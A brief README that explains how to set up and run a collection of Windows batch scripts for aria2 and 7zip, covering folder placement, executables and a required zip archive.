# How to use

- Download `*.cmd` file into the directory you would like (`A:\aria2`)
- Download and send corresponding `*.exe` to `\bin` child directory (`A:\aria2\bin`)
- 7zip batch scripts must have `https://raw.githubusercontent.com/candrapersada/batchscript/main/iTunes/batchscript_2.0.zip` in the same folder with `*.cmd` files
- Run `*.cmd` or drag'n drop files on `*.cmd` to work
